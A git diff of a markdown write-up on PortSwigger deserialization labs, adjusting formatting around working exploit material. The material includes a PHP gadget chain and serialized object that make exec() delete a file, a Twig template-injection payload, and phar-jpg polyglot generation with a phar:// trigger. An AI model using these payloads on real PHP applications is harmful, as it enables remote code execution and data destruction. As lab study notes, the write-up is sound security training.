@@ -483,13 +483,13 @@ You can retrieve the file by adding ~
 that the __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate. 
 
 From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization>
-``` 
+ 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ab28401a-94ce-4898-af70-8af39f56fd80)
 
 
 
 
-`• Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested.` 
+• Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested. 
 
 From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization> 
 
@@ -497,7 +497,8 @@ From <https://portswigger.net/web-security/deserialization/exploiting/lab-deseri
 
 
 
-• You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where: 
+• You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where:
+
 ```
 CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"; CustomTemplate->desc = DefaultMap; DefaultMap->callback = "exec"
 ``` 
@@ -513,9 +514,8 @@ To solve the lab, Base64 and URL-encode the following serialized object, and pas
 
 ```
 O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
+```
 
-From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization>
-``` 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/688985d9-73ab-4972-9fff-e4cadfe32165)
 
 
@@ -562,6 +562,7 @@ From <https://portswigger.net/web-security/deserialization/exploiting/lab-deseri
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
 ```
 
+
 From <https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain> 
 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2ee8037-490e-4a02-9827-e0fc1a5c92e9)
@@ -569,6 +570,7 @@ From <https://portswigger.net/web-security/deserialization/exploiting/lab-deseri
 
 
 Our exploit
+
 ```
 class CustomTemplate {}
 class Blog {}
@@ -578,6 +580,8 @@ $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.
 $blog->user = 'Carlos';
 $object->template_file_path = $blog;
 ```
+
+
 
 Replace the entire pop exploit class with our exploit
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/43c1ccbd-3cd5-4e60-b4bc-b92aced9171b)
@@ -595,7 +599,8 @@ Deprecated: Creation of dynamic property Blog::$user is deprecated in /home/kali
 
 Deprecated: Creation of dynamic property CustomTemplate::$template_file_path is deprecated in /home/kali/Desktop/phar-jpg-polyglot/phar_jpg_polyglot.php on line 44
 string(217) "O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";s:4:"user";s:6:"carlos";}}"
+```
 
 Upload outputed jpg file and call with phar://
 https://0a2e00b103d1a8b783ba19bf0016004a.web-security-academy.net/cgi-bin/avatar.php?avatar=phar://wiener
-```
+
